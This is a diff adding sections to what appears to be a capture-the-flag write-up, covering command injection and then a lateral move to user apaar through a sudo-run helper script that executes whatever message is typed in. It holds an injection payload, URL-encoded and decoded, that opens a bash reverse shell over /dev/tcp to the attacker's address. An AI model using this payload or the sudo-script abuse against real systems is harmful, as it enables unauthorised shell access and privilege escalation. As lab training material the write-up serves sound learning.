@@ -86,5 +86,56 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 
 Now I test payloads to see what pings back. 
 
+Reverse shell
+
+Sending a bash rev shell we can get a reverse shell from the command injection we just found. 
+
+```
+command=id%3bbash%20-c%20%22%2fbin%2fbash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.8.153.120%2f9999%200%3e%261%
+```
+Decoded
+```
+command=id;bash -c "/bin/bash -i >& /dev/tcp/10.8.153.120/9999 0>&1"
+```
+
+![image](https://user-images.githubusercontent.com/5285547/127405379-d0199737-5cdb-4af3-a69b-57769ef1529f.png)
+
+
+## User
+
+Checking sudo -l as www-data shows us something intresting. 
+
+```
+Matching Defaults entries for www-data on ubuntu:                                                                                                                                     env_reset, mail_badpass,                                                                                                                                                         secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                                                                                                                 
+User www-data may run the following commands on ubuntu:                                                                                                                               (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh                                                                                                                             
+
+
+www-data@ubuntu:/tmp$  cat /home/apaar/.helpline.sh
+#!/bin/bash
+
+echo
+echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
+echo
+
+read -p "Enter the person whom you want to talk with: " person
+
+read -p "Hello user! I am $person,  Please enter your message: " msg
+
+$msg 2>/dev/null
+
+echo "Thank you for your precious time!"
+```
+
+The script seems to read a name and add it to the person variable.  
+Then ask for a msg but never use it. 2>/dev/null
+2=STDERR, so send all errors to nothing (but still executing). 
+
+I send another ping to myself to prove its working. 
+
+![image](https://user-images.githubusercontent.com/5285547/127407467-11686b54-374c-4094-941b-282f44528d54.png)
+
+Then I try simply /bin/bash for a shell as the user. 
+
+
 
 
